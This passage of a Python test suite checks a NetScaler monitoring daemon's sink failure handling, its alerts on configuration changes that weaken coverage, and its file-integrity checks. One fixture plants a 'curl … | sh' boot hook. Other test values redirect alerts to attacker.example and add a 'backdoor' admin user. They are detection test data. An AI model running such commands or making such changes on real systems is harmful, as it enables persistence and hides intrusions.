    stop_after(svc, 0)
    await svc.syslog_loop()
    restarted = Service(svc.rt, sinks=[], database=svc.db)
    assert restarted.audit_status(device) == (AuditStatus.UNAVAILABLE, seen)
    (svc.cfg.paths.state_dir / "audit-feed.json").write_text("{not json")
    assert Service(svc.rt, sinks=[], database=svc.db).audit_status(device) == (None, None)


async def test_ha_role_is_looked_up_only_for_a_config_change(setup, monkeypatch: pytest.MonkeyPatch) -> None:  # type: ignore[no-untyped-def]
    svc, fake, _sink = setup
    service = _ha_service(svc)
    calls = []

    async def ha_nodes(self):  # type: ignore[no-untyped-def]
        calls.append(1)
        return [{"id": 0, "hacurmasterstate": "Secondary"}]

    monkeypatch.setattr(NitroClient, "ha_nodes", ha_nodes)

    def touch(i: int) -> None:  # after the baseline: a full fetch without a config change
        if i == 2:
            fake.lastconfigchangedtime = "touched"

    stop_after(service, 3, touch)
    await service.config_loop(service.cfg.devices[0])
    fetches = [r for r in fake.requests if r.url.path.endswith("/nsrunningconfig")]
    assert len(fetches) == 2 and calls == []
    service._stop.clear()
    finding = await _low_risk_change(service, fake, service.cfg.devices[0])
    assert calls == [1]
    assert finding["severity"] == "low" and finding["evidence"]["attribution_status"] is None


async def test_unavailable_audit_feed_escalation_survives_outage_and_restart(setup, monkeypatch: pytest.MonkeyPatch) -> None:  # type: ignore[no-untyped-def]
    svc, fake, _sink = setup
    seen = datetime.now(UTC) - timedelta(minutes=10)
    svc.pipeline.health["ns-gw-01"].record("nslog", 3, seen)

    def down(*args, **kwargs):  # type: ignore[no-untyped-def]
        raise _db_down()

    monkeypatch.setattr(svc.db, "save_finding", down)

    def mutate(i: int) -> None:
        if i == 2:
            fake.running = BASE + "add server web1 10.0.0.5\n"
            fake.lastconfigchangedtime = "later"

    stop_after(svc, 3, mutate)
    await svc.config_loop(svc.cfg.devices[0])  # the change is found, but cannot be stored
    assert "config-running" in {doc["rule_id"] for doc in svc.findings_log.read()}
    monkeypatch.undo()
    # The restarted daemon has no record of the audit feed: the pending finding keeps the
    # status it was evaluated with.
    restarted = Service(svc.rt, sinks=[], database=svc.db)
    assert restarted.audit_status("ns-gw-01") == (None, None)
    stop_after(restarted, 1)
    await restarted.config_loop(restarted.cfg.devices[0])
    docs = restarted.db.recent_findings(datetime.now(UTC) - timedelta(hours=1))
    finding = next(doc for doc in docs if doc["rule_id"] == "config-running")
    assert finding["severity"] == "high"
    assert finding["evidence"]["attribution_status"] == "unavailable"
    assert finding["evidence"]["audit_unavailable_since"] == seen.isoformat()


# ---- notification sinks -----------------------------------------------------------------


class FailingSink:
    name = "webhook"
    min_severity = Severity.INFO

    def __init__(self) -> None:
        self.fail = True
        self.sent: list[Finding] = []

    async def send(self, f: Finding) -> None:
        if self.fail:
            raise ConnectionError("relay unreachable")
        self.sent.append(f)


def _healthy(svc: Service, *sinks) -> Service:  # type: ignore[no-untyped-def]
    cfg = svc.cfg.model_copy(update={
        "syslog": svc.cfg.syslog.model_copy(update={"enabled": False})})
    service = Service(Runtime(cfg, svc.rt.key_loader, nitro_transport=svc.rt.nitro_transport,
                              config_path=svc.rt.config_path), sinks=list(sinks),
                      database=svc.db)
    service._ok(cfg.devices[0])
    return service


async def test_failing_sink_is_reported_through_the_other_sinks(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, collect = setup
    hook = FailingSink()
    service = _healthy(svc, collect, hook)
    assert service.status()["state"] == "healthy"
    start = datetime.now(UTC)
    await service.record(Finding("test|1", "test-rule", "Test", Severity.HIGH, "health", None,
                                 "test"))
    await service.deliver_pending()
    assert service.status()["state"] == "healthy"  # one failed attempt is not an outage
    later = start + timedelta(minutes=16)
    await service.deliver_pending(later)
    await service.check_sinks(later + timedelta(minutes=1))  # once per episode
    await service.deliver_pending(later)
    alerts = [f for f in collect.sent if f.rule_id == "notification-sink-failing"]
    assert len(alerts) == 1 and alerts[0].severity is Severity.HIGH
    assert "relay unreachable" in alerts[0].summary
    queued = service.db.pending(now=start + timedelta(days=1))
    assert not [d for d in queued if d.sink == "webhook"
                and d.finding.rule_id == "notification-sink-failing"]
    assert service.status()["state"] == "healthy"  # sampled now: not failing for 15 minutes
    status = service.status(later)
    assert status["state"] == "degraded" and status["notifications"]["webhook"]["failing"]
    assert any("Notification sink webhook" in warning for warning in status["warnings"])
    assert "NOTIFICATION SINK FAILING: webhook" in service.digest(later).summary
    hook.fail = False
    recovered = start + timedelta(hours=3)
    await service.deliver_pending(recovered)
    await service.deliver_pending(recovered)
    assert "notification-sink-recovered" in {f.rule_id for f in collect.sent}
    assert "test-rule" in {f.rule_id for f in hook.sent}
    assert service.status(recovered)["state"] == "healthy"


class Blackhole:
    """A SIEM that drops traffic: every attempt hangs, then times out."""

    name = "siem"
    min_severity = Severity.INFO

    def __init__(self) -> None:
        self.attempts = 0

    async def send(self, f: Finding) -> None:
        self.attempts += 1
        await asyncio.sleep(0.05)
        raise TimeoutError("connect timed out")


async def test_a_failing_sink_cannot_hold_back_the_others(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, _collect = setup
    email = CollectSink()
    email.name = "smtp"
    email.min_severity = Severity.HIGH
    hole = Blackhole()
    service = _healthy(svc, hole, email)
    for i in range(100):  # an older SIEM-only backlog fills the whole batch
        await service.record(Finding(f"info|{i}", "info-rule", "I", Severity.INFO, "health",
                                     None, "i"))
    await service.record(Finding("crit|1", "crit-rule", "C", Severity.CRITICAL, "health", None,
                                 "c"))
    now = datetime.now(UTC)
    passes = 0
    while service.db.pending(now) and passes < 5:
        await service.deliver_pending(now)
        passes += 1
    assert passes <= 2  # whatever the outbox order, the batch limit is passed quickly
    assert [f.rule_id for f in email.sent] == ["crit-rule"]
    assert hole.attempts <= service_module.SINK_CONCURRENCY  # the rest were deferred unsent
    await service.deliver_pending(now + timedelta(seconds=10))  # the breaker is still open
    assert hole.attempts <= service_module.SINK_CONCURRENCY
    probe = hole.attempts
    await service.deliver_pending(now + timedelta(seconds=31))  # one probe, then deferred
    assert probe < hole.attempts <= probe + service_module.SINK_CONCURRENCY
    # Reported at the start of the next pass and delivered in that same pass.
    await service.deliver_pending(now + timedelta(minutes=16))
    alerts = [f for f in email.sent if f.rule_id == "notification-sink-failing"]
    assert len(alerts) == 1 and "connect timed out" in alerts[0].summary


class Selective:
    name = "webhook"
    min_severity = Severity.INFO

    def __init__(self) -> None:
        self.down = False
        self.sent: list[Finding] = []

    async def send(self, f: Finding) -> None:
        if self.down:
            raise ConnectionError("relay unreachable")
        if f.rule_id == "poison":
            raise ConnectionError("554 message rejected")
        self.sent.append(f)


async def test_one_undeliverable_notification_does_not_mask_a_later_outage(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, collect = setup
    hook = Selective()
    service = _healthy(svc, collect, hook)

    def alerts(rule: str = "notification-sink-failing") -> list[Finding]:
        return [f for f in collect.sent if f.rule_id == rule]

    await service.record(Finding("poison|1", "poison", "P", Severity.HIGH, "health", None, "p"))
    t0 = datetime.now(UTC)
    await service.deliver_pending(t0)
    await service.deliver_pending(t0 + timedelta(minutes=16))
    assert len(alerts()) == 1  # nothing delivered yet: indistinguishable from an outage
    await service.record(Finding("ok|1", "ok-rule", "O", Severity.HIGH, "health", None, "o"))
    t2 = t0 + timedelta(minutes=17)
    await service.deliver_pending(t2)  # the poison row trips the breaker: "ok" is deferred
    t2 += timedelta(seconds=31)
    await service.deliver_pending(t2)
    await service.deliver_pending(t2)
    assert "ok-rule" in {f.rule_id for f in hook.sent}
    assert len(alerts("notification-sink-recovered")) == 1
    summary = service.status(t2)["notifications"]["webhook"]
    assert not summary["failing"] and summary["undelivered_failures"] == 1  # the stuck row
    # The stuck row keeps failing while the sink delivers: no new episode.
    await service.deliver_pending(t2 + timedelta(hours=1))
    await service.deliver_pending(t2 + timedelta(hours=2))
    assert len(alerts()) == 1
    hook.down = True  # a real outage later
    for i in range(3):
        await service.record(Finding(f"real|{i}", "real-rule", "R", Severity.CRITICAL,
                                     "health", None, "r"))
    t3 = t2 + timedelta(hours=2, minutes=1)
    await service.deliver_pending(t3)
    await service.deliver_pending(t3 + timedelta(minutes=30))
    assert len(alerts()) == 2
    assert service.status(t3 + timedelta(minutes=30))["notifications"]["webhook"]["failing"]


async def test_sink_failure_clock_survives_restart_and_reload(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, collect = setup
    hook = FailingSink()
    service = _healthy(svc, collect, hook)
    await service.record(Finding("test|1", "test-rule", "Test", Severity.HIGH, "health", None,
                                 "test"))
    start = datetime.now(UTC)
    await service.deliver_pending(start)

    def alerts() -> list[Finding]:
        return [f for f in collect.sent if f.rule_id == "notification-sink-failing"]

    restarted = _healthy(svc, collect, hook)
    await restarted.deliver_pending(start + timedelta(minutes=10))
    assert not alerts()
    assert restarted.status(start + timedelta(minutes=10))["state"] == "healthy"
    restarted._configure()  # a settings reload starts the in-memory tracking afresh as well
    later = start + timedelta(minutes=16)
    await restarted.deliver_pending(later)  # memory alone: first failure at +16 min
    assert len(alerts()) == 1
    alert = alerts()[0]
    assert alert.evidence["failing_since"] < start.isoformat()  # when the row was queued
    # Reported from the outbox at the start of the pass, before the row's third attempt.
    assert alert.evidence["undelivered"] == 1 and alert.evidence["max_attempts"] == 2
    assert "1 notification(s) for the webhook sink" in alert.summary
    assert "relay unreachable" in alert.summary
    status = restarted.status(later)
    assert status["state"] == "degraded" and status["notifications"]["webhook"]["failing"]
    hook.fail = False
    recovered = later + timedelta(hours=1)
    await restarted.deliver_pending(recovered)
    await restarted.deliver_pending(recovered)
    assert "notification-sink-recovered" in {f.rule_id for f in collect.sent}
    summary = restarted.status(recovered)["notifications"]["webhook"]
    assert not summary["failing"] and summary["oldest_failure"] is None


async def test_restart_does_not_turn_a_stuck_notification_into_an_outage(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, collect = setup
    hook = Selective()
    service = _healthy(svc, collect, hook)
    await service.record(Finding("poison|1", "poison", "P", Severity.HIGH, "health", None, "p"))
    t0 = datetime.now(UTC)
    await service.deliver_pending(t0)
    await service.record(Finding("ok|1", "ok-rule", "O", Severity.CRITICAL, "health", None, "o"))
    await service.deliver_pending(t0 + timedelta(seconds=31))  # "ok" first, then "poison" again
    assert "ok-rule" in {f.rule_id for f in hook.sent}
    restarted = _healthy(svc, collect, hook)
    for minutes in (16, 32, 64, 128):
        await restarted.deliver_pending(t0 + timedelta(minutes=minutes))
    assert not [f for f in collect.sent if f.rule_id == "notification-sink-failing"]
    summary = restarted.status(t0 + timedelta(minutes=128))["notifications"]["webhook"]
    assert not summary["failing"] and summary["undelivered_failures"] == 1
    assert summary["last_success"] == (t0 + timedelta(seconds=31)).isoformat()
    hook.down = True  # a real outage after the restart is still reported
    await restarted.record(Finding("real|1", "real-rule", "R", Severity.CRITICAL, "health",
                                   None, "r"))
    t1 = t0 + timedelta(minutes=130)
    await restarted.deliver_pending(t1)
    await restarted.deliver_pending(t1 + timedelta(minutes=16))
    assert len([f for f in collect.sent if f.rule_id == "notification-sink-failing"]) == 1


async def test_status_snapshot_tolerates_concurrent_source_inserts(setup) -> None:  # type: ignore[no-untyped-def]
    import time

    svc, _fake, _sink = setup
    feed = svc.pipeline.health[svc.cfg.devices[0].name]
    for i in range(20000):  # slow enough to serialise that inserts land mid-iteration
        feed.record(f"source-{i}", 1, None)
    stop = threading.Event()

    def insert() -> None:  # pipeline.poll seeing a new source class in another thread
        i = 0
        while not stop.is_set():
            feed.record(f"new-{i}", 1, None)
            i += 1
            time.sleep(0.0005)

    writer = threading.Thread(target=insert)
    writer.start()
    try:
        for _ in range(10):
            svc.status()
    finally:
        stop.set()
        writer.join()


# ---- monitor tamper ---------------------------------------------------------------------


@requires_peercred
async def test_pause_and_resume_are_reported_with_the_actor(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, _sink = setup
    set_password(svc.cfg.paths.state_dir / "web-users.json", "admin", "daemon-admin-test-password")
    task = asyncio.create_task(svc.run())
    try:
        await asyncio.wait_for(svc._reload_complete.wait(), 5)
        client = ControlClient(svc.cfg.paths.control_socket)
        await client.call("admin", "monitor.pause")
        await client.call("admin", "monitor.pause")  # already paused: nothing new
        await client.call("admin", "monitor.resume")
        docs = svc.db.recent_findings(datetime.now(UTC) - timedelta(hours=1))
        reduced = [doc for doc in docs if doc["rule_id"] == "monitor-coverage-reduced"]
        resumed = [doc for doc in docs if doc["rule_id"] == "monitor-resumed"]
        assert len(reduced) == 1 and reduced[0]["severity"] == "high"
        assert reduced[0]["evidence"]["actor"] == "admin" and "admin:" in reduced[0]["summary"]
        assert len(resumed) == 1 and resumed[0]["severity"] == "info"
        assert resumed[0]["evidence"]["actor"] == "admin"
    finally:
        svc.stop()
        await asyncio.wait_for(task, 5)


def test_coverage_reductions_lists_each_weakening(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, _sink = setup
    cfg = svc.cfg
    previous = cfg.model_copy(update={
        "devices": [*cfg.devices, Device(name="edge", nsip="192.0.2.30")],
        "notify": Notify(webhook=WebhookSink(url="https://hooks.example/scalar"))})
    candidate = cfg.model_copy(update={
        "syslog": cfg.syslog.model_copy(update={"enabled": False}),
        "defaults": cfg.defaults.model_copy(update={
            "intervals": cfg.defaults.intervals.model_copy(update={"syslog_silence_alert": 3600})})})
    assert coverage_reductions(previous, candidate) == [
        "removed device(s) edge", "disabled syslog collection",
        "removed notification sink(s) webhook",
        "raised the syslog silence alert from 900s to 3600s"]
    assert coverage_reductions(candidate, previous) == []


def _with(cfg: Config, path: str, value: object) -> Config:
    document = cfg.model_dump(mode="json")
    *parents, leaf = path.split(".")
    target = document
    for part in parents:
        target = target[int(part)] if isinstance(target, list) else target[part]
    target[leaf] = value
    return Config.model_validate(document)


@pytest.mark.parametrize(("path", "value", "expected", "reversible"), [
    ("notify.smtp.min_severity", "critical",
     "raised the smtp minimum severity from medium to critical", True),
    ("notify.webhook.min_severity", "critical",
     "raised the webhook minimum severity from high to critical", True),
    ("notify.siem.min_severity", "high", "raised the siem minimum severity from info to high",
     True),
    ("notify.webhook.url", "https://attacker.example/x",
     "changed the webhook sink destination (url)", False),
    ("notify.smtp.recipients", ["soc@attacker.example"],
     "changed the smtp sink destination (recipients)", False),
    ("notify.smtp.sender", "x@attacker.example", "changed the smtp sink destination (sender)",
     False),
    ("notify.smtp.host", "smtp.attacker.example", "changed the smtp sink destination (host)",
     False),
    ("notify.siem.host", "siem.attacker.example", "changed the siem sink destination (host)",
     False),
    ("notify.siem.port", 514, "changed the siem sink destination (port)", False),
    ("syslog.admin_networks", ["10.20.0.0/16", "0.0.0.0/0"],
     "allowed more admin networks: 0.0.0.0/0", True),
    ("syslog.admin_users", ["nsroot", "backdoor"], "allowed more admin users: backdoor", True),
    ("syslog.admin_networks", [], "cleared the admin network allowlist", True),
    ("devices.0.nsip", "192.0.2.99", "changed ns-gw-01 nsip", False),
    ("devices.0.syslog_sources", ["10.0.0.10", "192.0.2.98"],
     "changed ns-gw-01 syslog_sources", False),
    ("devices.0.spki_pin", "A" * 43 + "=", "changed ns-gw-01 spki_pin", False),
    ("devices.0.spki_pinning", False, "changed ns-gw-01 spki_pinning", False),
    ("defaults.ca_bundle", "/etc/ssl/other.pem", "changed the device defaults (ca_bundle)", False),
    ("defaults.intervals.config_probe", 3600,
     "raised the config probe interval from 60s to 3600s", True),
])
def test_coverage_reductions_detect_quiet_weakening(setup, path: str, value: object, expected: str, reversible: bool) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, _sink = setup
    previous = _with(svc.cfg, "notify", {
        "smtp": {"host": "smtp.example", "sender": "nr@example", "recipients": ["soc@example"]},
        "siem": {"host": "siem.example"}, "webhook": {"url": "https://hooks.example/n"}})
    previous = _with(_with(previous, "syslog.admin_networks", ["10.20.0.0/16"]),
                     "syslog.admin_users", ["nsroot"])
    candidate = _with(previous, path, value)
    assert coverage_reductions(previous, candidate) == [expected]
    if reversible:  # the opposite change restores coverage and is not reported
        assert coverage_reductions(candidate, previous) == []


async def test_redirected_sink_is_alerted_at_its_old_destination_only(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, collect = setup
    document = svc.cfg.model_dump(mode="json")
    document["notify"] = {"webhook": {"url": "https://hooks.example/scalar"}}
    svc.rt.config_path.write_text(yaml.safe_dump(document))
    hook = Selective()
    service = Service(Runtime(Config.model_validate(document), svc.rt.key_loader,
                              nitro_transport=svc.rt.nitro_transport,
                              config_path=svc.rt.config_path),
                      sinks=[collect, hook], database=svc.db)
    document["notify"]["webhook"]["url"] = "https://attacker.example/collect"
    svc.rt.config_path.write_text(yaml.safe_dump(document))
    assert (await service.apply_settings())["workers_reloaded"]
    assert [f.rule_id for f in hook.sent] == ["monitor-coverage-reduced"]  # before the reload
    queued = [d.sink for d in service.db.pending(now=datetime.now(UTC) + timedelta(minutes=1))
              if d.finding.rule_id == "monitor-coverage-reduced"]
    assert queued == ["collect"]  # never queued for the new destination


async def test_settings_that_reduce_coverage_alert_remaining_sinks(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, collect = setup
    document = svc.cfg.model_dump(mode="json")
    document["notify"] = {"webhook": {"url": "https://hooks.example/scalar"}}
    svc.rt.config_path.write_text(yaml.safe_dump(document))
    service = Service(Runtime(Config.model_validate(document), svc.rt.key_loader,
                              nitro_transport=svc.rt.nitro_transport,
                              config_path=svc.rt.config_path),
                      sinks=[collect, FailingSink()], database=svc.db)
    document["notify"] = {}
    document["syslog"]["enabled"] = False
    svc.rt.config_path.write_text(yaml.safe_dump(document))
    token = service_module._ACTOR.set("alice")
    try:
        assert (await service.apply_settings())["applied"]
    finally:
        service_module._ACTOR.reset(token)
    queued = [d for d in service.db.pending(now=datetime.now(UTC) + timedelta(minutes=1))
              if d.finding.rule_id == "monitor-coverage-reduced"]
    assert [d.sink for d in queued] == ["collect"]
    finding = queued[0].finding
    assert finding.severity is Severity.HIGH and finding.evidence["actor"] == "alice"
    assert finding.summary == ("alice: disabled syslog collection; "
                               "removed notification sink(s) webhook")


# ---- per-source coverage ----------------------------------------------------------------


async def test_status_and_digest_list_log_sources_never_received(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, _sink = setup
    device = svc.cfg.devices[0]
    svc._ok(device)
    now = datetime.now(UTC)
    feed = svc.pipeline.health[device.name]
    feed.record("nslog", 5, now)
    status = svc.status()["devices"][device.name]["syslog"]
    assert status["missing_sources"] == ["shell (bash.log/sh.log)", "web access/error"]
    assert "shell (bash.log/sh.log): never received" in status["coverage"]
    assert status["source_coverage"] == [
        {"source": "ns.log", "lines": 5, "last_received": now.isoformat(), "expected": True},
        {"source": "shell (bash.log/sh.log)", "lines": 0, "last_received": None,
         "expected": True},
        {"source": "web access/error", "lines": 0, "last_received": None, "expected": True},
        {"source": "auth.log", "lines": 0, "last_received": None, "expected": False},
        {"source": "notice.log", "lines": 0, "last_received": None, "expected": False}]
    digest = svc.digest(now)
    assert "All 1 device(s) polled OK" not in digest.summary
    assert ("LOG SOURCES NEVER RECEIVED since monitor start: ns-gw-01 "
            "(shell (bash.log/sh.log), web access/error)") in digest.summary
    assert digest.severity is Severity.MEDIUM
    assert digest.evidence["missing_sources"] == {device.name: status["missing_sources"]}
    feed.record("bashlog", 1, now)
    feed.record("httpaccess", 2, now)
    digest = svc.digest(now)
    assert "All 1 device(s) polled OK" in digest.summary and digest.severity is Severity.INFO
    assert svc.status()["devices"][device.name]["syslog"]["missing_sources"] == []


# ---- file-integrity monitoring --------------------------------------------------------------


def _fim_service(svc: Service, fake: FakeNitro) -> Service:
    """The setup service with FIM enabled on its device and the sc_fim account in the vault."""
    device = svc.cfg.devices[0].model_copy(update={"fim": DeviceFim(enabled=True)})
    cfg = svc.cfg.model_copy(update={"devices": [device]})
    svc.rt.provider.vault.set("sc_fim", Credential("sc_fim", "fim-password"), actor="t")
    fake.users["sc_fim"] = "fim-password"
    fake.files.update({"/nsconfig/rc.netscaler": b"#!/bin/sh\n", "/var/vpn/themes/a.js": b"x"})
    return Service(Runtime(cfg, svc.rt.key_loader, nitro_transport=svc.rt.nitro_transport,
                           config_path=svc.rt.config_path), sinks=svc.router.sinks,
                   database=svc.db)


def _logins(fake: FakeNitro) -> list[str]:
    import json

    return [json.loads(r.content)["login"]["username"] for r in fake.requests
            if r.url.path.endswith("/login")]


async def test_fim_loop_uses_its_own_account_and_one_session(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, sink = setup
    service = _fim_service(svc, fake)
    device = service.cfg.devices[0]

    def mutate(i: int) -> None:
        if i == 2:
            fake.files["/nsconfig/nsafter.sh"] = b"curl http://203.0.113.9/x | sh\n"

    stop_after(service, 3, mutate)
    await service.fim_loop(device)
    await service.deliver_pending()
    sent = {f.rule_id: f for f in sink.sent}
    assert sent["fim-baseline-recorded"].severity is Severity.MEDIUM
    assert sent["fim-boot-hook-changed"].severity is Severity.CRITICAL
    assert _logins(fake) == ["sc_fim"]  # never sc_nitro, and one long-lived session
    health = service.status()["devices"][device.name]["fim"]
    assert health["enabled"] and health["successes"] == 3 and health["coverage_gaps"] == []
    assert {f["rule_id"] for f in service.findings_log.read()} >= {"fim-boot-hook-changed"}


async def test_fim_is_off_unless_enabled_per_device(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, _sink = setup
    assert svc.fim_monitors == {}
    assert svc.status()["devices"][svc.cfg.devices[0].name]["fim"] == {"enabled": False}
    running = asyncio.create_task(svc.run())
    try:
        await asyncio.wait_for(svc._reload_complete.wait(), 5)
        assert not [t for t in asyncio.all_tasks() if t.get_name().startswith("fim:")]
    finally:
        svc.stop()
        await asyncio.wait_for(running, 5)
    assert "sc_fim" not in _logins(fake)


async def test_fim_task_starts_for_an_enabled_device(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, _sink = setup
    service = _fim_service(svc, fake)
    running = asyncio.create_task(service.run())
    try:
        await asyncio.wait_for(service._reload_complete.wait(), 5)
        assert [t.get_name() for t in asyncio.all_tasks()
                if t.get_name().startswith("fim:")] == ["fim:ns-gw-01"]
    finally:
        service.stop()
        await asyncio.wait_for(running, 5)


async def test_fim_account_rejection_is_reported_once(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, sink = setup
    service = _fim_service(svc, fake)
    fake.users["sc_fim"] = "rotated-on-the-appliance"
    stop_after(service, 3)
    await service.fim_loop(service.cfg.devices[0])
    await service.deliver_pending()
    unavailable = [f for f in sink.sent if f.rule_id == "fim-unavailable"]
    assert len(unavailable) == 1 and unavailable[0].severity is Severity.HIGH
    assert unavailable[0].evidence["account"] == "local:sc_fim"
    assert service.status()["state"] == "degraded"
    # The FIM account's lockout does not block config polling with sc_nitro.
    stop_after(service, 1)
    service._stop.clear()
    await service.config_loop(service.cfg.devices[0])
    assert service.health["ns-gw-01"].last_ok is not None


async def test_fim_coverage_gap_degrades_status_and_digest(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, sink = setup
    service = _fim_service(svc, fake)
    fake.denied_paths = {"/var/vpn"}
    stop_after(service, 1)
    await service.fim_loop(service.cfg.devices[0])
    await service.deliver_pending()
    assert [f.rule_id for f in sink.sent if f.rule_id == "fim-coverage-unknown"] == [
        "fim-coverage-unknown"]
    service._ok(service.cfg.devices[0])
    status = service.status()
    assert status["state"] == "degraded"
    assert "ns-gw-01: file-integrity coverage unknown for 1 path(s)" in status["warnings"]
    digest = service.digest(datetime.now(UTC))
    assert "FILE INTEGRITY COVERAGE UNKNOWN: ns-gw-01 (1 path(s))" in digest.summary
    assert digest.severity is Severity.MEDIUM


async def test_fim_pause_prevents_listing(setup) -> None:  # type: ignore[no-untyped-def]
    svc, fake, _sink = setup
    service = _fim_service(svc, fake)
    await service.pause_monitoring()
    stop_after(service, 2)
    await service.fim_loop(service.cfg.devices[0])
    assert "sc_fim" not in _logins(fake)


def test_disabling_fim_is_a_coverage_reduction(setup) -> None:  # type: ignore[no-untyped-def]
    svc, _fake, _sink = setup
    cfg = svc.cfg
    enabled = cfg.model_copy(update={"devices": [
        cfg.devices[0].model_copy(update={"fim": DeviceFim(enabled=True)})]})
    slower = cfg.model_copy(update={"defaults": cfg.defaults.model_copy(update={
        "fim": FimDefaults(webroot_interval=900, max_entries=1000)})})
    assert coverage_reductions(enabled, cfg) == [
        "disabled file-integrity monitoring on ns-gw-01"]
    assert coverage_reductions(cfg, slower) == [
        "raised the file-integrity web-root walk interval from 600s to 900s",
        "lowered the file-integrity limits (max_entries)"]
    assert coverage_reductions(cfg, enabled) == []
